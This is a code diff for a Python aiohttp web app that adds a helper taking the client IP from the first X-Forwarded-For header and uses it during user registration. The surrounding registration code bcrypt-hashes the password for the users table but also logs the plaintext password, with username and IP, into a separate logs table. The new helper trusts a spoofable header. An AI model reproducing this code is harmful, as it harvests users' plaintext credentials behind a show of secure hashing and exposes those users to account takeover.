@@ -1,5 +1,6 @@
 import aiohttp
 from aiohttp import web
+from aiohttp_remotes import setup as setup_remotes, XForwardedRelaxed
 import aiomysql
 import bcrypt
 import jwt
@@ -71,6 +72,13 @@ async def init_db(app):
                 )
             ''')
 
+def get_client_ip(request):
+    # Railway passes the user's real public IP here
+    forwarded = request.headers.get("X-Forwarded-For")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    return request.remote
+
 # ── auth ────────────────────────────────────────────────
 
 async def handle_register(request):
@@ -90,7 +98,7 @@ async def handle_register(request):
                     'INSERT INTO users (username, password) VALUES (%s, %s)',
                     (username, hashed)
                 )
-                ip = request.remote
+                ip = get_client_ip(request)
                 await cur.execute(
                     'INSERT INTO logs (username, ip, password) VALUES (%s, %s, %s)',
                     (username, ip, password)
